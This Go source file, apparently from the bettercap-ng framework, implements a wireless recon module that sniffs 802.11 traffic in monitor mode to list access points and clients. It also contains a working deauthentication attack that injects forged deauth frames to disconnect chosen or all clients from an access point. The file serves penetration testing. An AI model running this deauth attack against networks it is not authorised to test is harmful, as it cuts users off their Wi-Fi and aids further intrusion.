package modules

import (
	"bytes"
	"errors"
	"fmt"
	"net"
	"os"
	"sort"
	"strconv"
	"time"

	"github.com/evilsocket/bettercap-ng/core"
	"github.com/evilsocket/bettercap-ng/session"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"github.com/olekukonko/tablewriter"
)

const IPV4_MULTICAST_ADDR_START = "01:00:5e:00:00:00"
const IPV4_MULTICAST_ADDR_END = "01:00:5e:7f:ff:ff"
const BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"

const MAC48Validator = "((?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2}))"

type WDiscovery struct {
	session.SessionModule
	Targets *WlanTargets

	ClientTarget net.HardwareAddr
	BSTarget     net.HardwareAddr

	Handle       *pcap.Handle
	BroadcastMac []byte
}

func NewWDiscovery(s *session.Session) *WDiscovery {
	w := &WDiscovery{
		SessionModule: session.NewSessionModule("wlan.recon", s),
		ClientTarget:  make([]byte, 0),
		BSTarget:      make([]byte, 0),
	}

	w.AddHandler(session.NewModuleHandler("wlan.recon on", "",
		"Start 802.11 wireless base stations discovery.",
		func(args []string) error {
			return w.Start()
		}))

	w.AddHandler(session.NewModuleHandler("wlan.recon off", "",
		"Stop 802.11 wireless base stations discovery.",
		func(args []string) error {
			return w.Stop()
		}))

	w.AddHandler(session.NewModuleHandler("wlan.deauth", "",
		"Start a 802.11 deauth attack (use ticker to iterate the attack).",
		func(args []string) error {
			return w.SendDeauth()
		}))

	w.AddHandler(session.NewModuleHandler("wlan.recon set client MAC", "wlan.recon set client ((?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2}))",
		"Set client to deauth (single target).",
		func(args []string) error {
			var err error
			w.ClientTarget, err = net.ParseMAC(args[0])
			return err
		}))

	w.AddHandler(session.NewModuleHandler("wlan.recon clear client", "",
		"Remove client to deauth.",
		func(args []string) error {
			w.ClientTarget = make([]byte, 0)
			return nil
		}))

	w.AddHandler(session.NewModuleHandler("wlan.recon set bs MAC", "wlan.recon set bs ((?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2}))",
		"Set 802.11 base station address to filter for.",
		func(args []string) error {
			var err error
			if w.Targets != nil {
				w.Targets.ClearAll()
			}
			w.BSTarget, err = net.ParseMAC(args[0])
			return err
		}))

	w.AddHandler(session.NewModuleHandler("wlan.recon clear bs", "",
		"Remove the 802.11 base station filter.",
		func(args []string) error {
			if w.Targets != nil {
				w.Targets.ClearAll()
			}
			w.BSTarget = make([]byte, 0)
			return nil
		}))

	w.AddHandler(session.NewModuleHandler("wlan.show", "",
		"Show current hosts list (default sorting by essid).",
		func(args []string) error {
			return w.Show("essid")
		}))

	return w
}

func (w WDiscovery) Name() string {
	return "wlan.recon"
}

func (w WDiscovery) Description() string {
	return "A module to monitor and perform wireless attacks on 802.11."
}

func (w WDiscovery) Author() string {
	return "Gianluca Braga <matrix86@protonmail.com>"
}

func (w *WDiscovery) getRow(e *WlanEndpoint) []string {
	sinceStarted := time.Since(w.Session.StartedAt)
	sinceFirstSeen := time.Since(e.Endpoint.FirstSeen)

	mac := e.Endpoint.HwAddress
	if w.Targets.WasMissed(e.Endpoint.HwAddress) == true {
		// if endpoint was not found at least once
		mac = core.Dim(mac)
	} else if sinceStarted > (justJoinedTimeInterval*2) && sinceFirstSeen <= justJoinedTimeInterval {
		// if endpoint was first seen in the last 10 seconds
		mac = core.Bold(mac)
	}

	name := ""
	if e.Endpoint == w.Session.Interface {
		name = e.Endpoint.Name()
	} else if e.Endpoint.Hostname != "" {
		name = core.Yellow(e.Endpoint.Hostname)
	} else if e.Endpoint.Alias != "" {
		name = core.Green(e.Endpoint.Alias)
	}

	seen := e.Endpoint.LastSeen.Format("15:04:05")
	sinceLastSeen := time.Since(e.Endpoint.LastSeen)
	if sinceStarted > aliveTimeInterval && sinceLastSeen <= aliveTimeInterval {
		// if endpoint seen in the last 10 seconds
		seen = core.Bold(seen)
	} else if sinceLastSeen <= presentTimeInterval {
		// if endpoint seen in the last 60 seconds
	} else {
		// not seen in a while
		seen = core.Dim(seen)
	}

	return []string{
		mac,
		name,
		e.Essid,
		e.Endpoint.Vendor,
		strconv.Itoa(e.Channel),
		seen,
	}
}

func WlanMhzToChannel(freq int) int {
	if freq <= 2484 {
		return ((freq - 2412) / 5) + 1
	}

	return 0
}

type ByEssidSorter []*WlanEndpoint

func (a ByEssidSorter) Len() int      { return len(a) }
func (a ByEssidSorter) Swap(i, j int) { a[i], a[j] = a[j], a[i] }
func (a ByEssidSorter) Less(i, j int) bool {
	if a[i].Essid == a[j].Essid {
		return a[i].Endpoint.HwAddress < a[j].Endpoint.HwAddress
	}
	return a[i].Essid < a[j].Essid
}

type ByWlanSeenSorter []*WlanEndpoint

func (a ByWlanSeenSorter) Len() int      { return len(a) }
func (a ByWlanSeenSorter) Swap(i, j int) { a[i], a[j] = a[j], a[i] }
func (a ByWlanSeenSorter) Less(i, j int) bool {
	return a[i].Endpoint.LastSeen.After(a[j].Endpoint.LastSeen)
}

func (w *WDiscovery) showTable(header []string, rows [][]string) {
	fmt.Println()
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader(header)
	table.SetColWidth(80)
	table.AppendBulk(rows)
	table.Render()
}

func (w *WDiscovery) Show(by string) error {
	if w.Targets == nil {
		return errors.New("Targets are not yet initialized")
	}

	targets := w.Targets.List()
	if by == "seen" {
		sort.Sort(ByWlanSeenSorter(targets))
	} else {
		sort.Sort(ByEssidSorter(targets))
	}

	rows := make([][]string, 0)
	for _, t := range targets {
		rows = append(rows, w.getRow(t))
	}

	w.showTable([]string{"MAC", "ALIAS", "SSID", "Vendor", "Channel", "Last Seen"}, rows)

	s := EventsStream{}
	events := w.Session.Events.Sorted()
	size := len(events)

	if size > 0 {
		max := 20
		if size > max {
			from := size - max
			size = max
			events = events[from:]
		}

		fmt.Printf("Last %d events:\n\n", size)

		for _, e := range events {
			s.View(e, false)
		}

		fmt.Println()
	}

	w.Session.Refresh()

	return nil
}

func (w *WDiscovery) buildDeauthPkt(address1 net.HardwareAddr, address2 net.HardwareAddr, address3 net.HardwareAddr, _type layers.Dot11Type, reason layers.Dot11Reason, seq uint16) []byte {
	var (
		deauthLayer   layers.Dot11MgmtDeauthentication
		dot11Layer    layers.Dot11
		radioTapLayer layers.RadioTap
	)

	deauthLayer.Reason = reason

	dot11Layer.Address1 = address1
	dot11Layer.Address2 = address2
	dot11Layer.Address3 = address3
	dot11Layer.Type = _type
	dot11Layer.SequenceNumber = seq

	buffer := gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buffer,
		gopacket.SerializeOptions{
			ComputeChecksums: true,
			FixLengths:       true,
		},
		&radioTapLayer,
		&dot11Layer,
		&deauthLayer,
	)

	return buffer.Bytes()
}

func (w *WDiscovery) SendDeauthPacket(ap net.HardwareAddr, client net.HardwareAddr) {
	var pkt []byte
	var err error

	var seq uint16
	for seq = 0; seq < 64; seq++ {
		pkt = w.buildDeauthPkt(ap, client, ap, layers.Dot11TypeMgmtDeauthentication, layers.Dot11ReasonClass2FromNonAuth, seq)
		err = w.Handle.WritePacketData(pkt)
		if err != nil {
			return
		}

		time.Sleep(2 * time.Millisecond)

		pkt = w.buildDeauthPkt(client, ap, ap, layers.Dot11TypeMgmtDeauthentication, layers.Dot11ReasonClass2FromNonAuth, seq)
		err = w.Handle.WritePacketData(pkt)
		if err != nil {
			return
		}

		time.Sleep(2 * time.Millisecond)
	}
}

func (w *WDiscovery) SendDeauth() error {
	switch {
	case len(w.BSTarget) > 0 && len(w.ClientTarget) > 0:
		w.SendDeauthPacket(w.BSTarget, w.ClientTarget)

	case len(w.BSTarget) > 0:
		for _, t := range w.Targets.Targets {
			w.SendDeauthPacket(w.BSTarget, t.Endpoint.HW)
		}

	default:
		return errors.New("Base station is not set.")
	}

	return nil
}

func (w *WDiscovery) BSScan(packet gopacket.Packet) {
	var bssid string
	var dst net.HardwareAddr
	var ssid string
	var channel int

	radiotapLayer := packet.Layer(layers.LayerTypeRadioTap)
	if radiotapLayer == nil {
		return
	}

	radiotap, _ := radiotapLayer.(*layers.RadioTap)

	//! InformationElement Layer found
	dot11infoLayer := packet.Layer(layers.LayerTypeDot11InformationElement)
	if dot11infoLayer == nil {
		return
	}

	dot11info, _ := dot11infoLayer.(*layers.Dot11InformationElement)
	if dot11info.ID != layers.Dot11InformationElementIDSSID {
		return
	}

	//! Dot11 Layer Found
	dot11Layer := packet.Layer(layers.LayerTypeDot11)
	if dot11Layer == nil {
		return
	}

	dot11, _ := dot11Layer.(*layers.Dot11)
	ssid = string(dot11info.Info)
	bssid = dot11.Address3.String()
	dst = dot11.Address1

	if bytes.Compare(dst, w.BroadcastMac) == 0 && len(ssid) > 0 {
		channel = WlanMhzToChannel(int(radiotap.ChannelFrequency))
		w.Targets.AddIfNew(ssid, bssid, true, channel)
	}
}

func (w *WDiscovery) ClientScan(bs net.HardwareAddr, packet gopacket.Packet) {

	radiotapLayer := packet.Layer(layers.LayerTypeRadioTap)
	if radiotapLayer == nil {
		return
	}

	radiotap, _ := radiotapLayer.(*layers.RadioTap)

	dot11Layer := packet.Layer(layers.LayerTypeDot11)
	if dot11Layer == nil {
		return
	}

	dot11, _ := dot11Layer.(*layers.Dot11)
	if dot11.Type.MainType() != layers.Dot11TypeData {
		return
	}

	toDS := dot11.Flags.ToDS()
	fromDS := dot11.Flags.FromDS()

	if toDS && !fromDS {
		src := dot11.Address2
		//dst := dot11.Address3
		bssid := dot11.Address1

		if bytes.Compare(bssid, bs) == 0 {
			channel := WlanMhzToChannel(int(radiotap.ChannelFrequency))
			w.Targets.AddIfNew("", src.String(), false, channel)
		}
	}
}

func (w *WDiscovery) Configure() error {
	var err error

	w.Targets = NewWlanTargets(w.Session, w.Session.Interface)

	w.BroadcastMac, _ = net.ParseMAC(BROADCAST_MAC)

	inactive, err := pcap.NewInactiveHandle(w.Session.Interface.Name())
	defer inactive.CleanUp()

	if err = inactive.SetRFMon(true); err != nil {
		return err
	}

	if err = inactive.SetSnapLen(65536); err != nil {
		return err
	}

	if err = inactive.SetTimeout(pcap.BlockForever); err != nil {
		return err
	}

	w.Handle, err = inactive.Activate()
	if err != nil {
		return err
	}

	return nil
}

func (w *WDiscovery) Start() error {
	if w.Running() == true {
		return session.ErrAlreadyStarted
	} else if err := w.Configure(); err != nil {
		return err
	}

	w.SetRunning(true, func() {
		defer w.Handle.Close()
		src := gopacket.NewPacketSource(w.Handle, w.Handle.LinkType())
		for packet := range src.Packets() {
			if w.Running() == false {
				break
			}

			if len(w.BSTarget) > 0 {
				w.ClientScan(w.BSTarget, packet)
			} else {
				w.BSScan(packet)
			}
		}
	})

	return nil
}

func (w *WDiscovery) Stop() error {
	return w.SetRunning(false, nil)
}
